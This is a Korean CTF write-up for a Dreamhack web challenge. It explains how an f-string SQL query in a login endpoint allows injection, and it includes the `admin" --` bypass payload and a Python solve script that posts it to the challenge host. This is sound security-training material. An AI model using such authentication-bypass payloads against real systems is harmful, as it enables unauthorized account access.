# Category

web

# Overview

로그인 서비스입니다.

SQL INJECTION 취약점을 통해 플래그를 획득하세요.

플래그는 flag.txt, FLAG 변수에 있습니다.

# Analysis

- flag는 POST `/login`에서 `admin`으로 로그인 되었을 때 반환된다.

- 서버가 실행될 때 데이터베이스의 `users`테이블에 `guest`, `admin` 계정이 생성된다.

- POST `/login`경로는 `userid`, `userpassword`를 통해 f-string으로 이루어진 쿼리문을 통해 데이터베이스에서 데이터를 가져와 응답한다.

  `userid`, `userpassword`값에 따라 쿼리문이 결정되기 때문에 sql injection 공격이 발생할 수 있는 문제가 있다.

# Exploitation

POST `/login`에서 쿼리문에 따라 데이터를 조회하기 때문에, `users`테이블에 존재하는 `admin`을 가져오기 위해 `userid`부분을 `admin" --`와 같이 조작하여 `admin`을 가져오고 뒷부분은 주석 처리하는 방식으로 쿼리문을 완성 시킬 수 있다.

```sql
-- 원본 쿼리
select *
from users
where userid="{userid}" and userpassword="{userpassword}"

-- 수정된 쿼리
select *
from users
where userid="admin" --" and userpassword="{userpassword}"
```

쿼리에 따라 admin 정보를 얻을 수 있으며, 다음 로직에 따라 flag값이 반환된다.

- 코드

  ```py
  # solve.py
  import re
  from requests import request as req

  res = req(
      method="POST",
      url="http://host3.dreamhack.games:14764/login",
      data={"userid": 'admin" --', "userpassword": ""},
  )

  matched = re.search("DH{.*}", res.text)

  print(matched.group() if matched else "NO FLAG")
  ```

# Flag

`DH{c1...d0}`
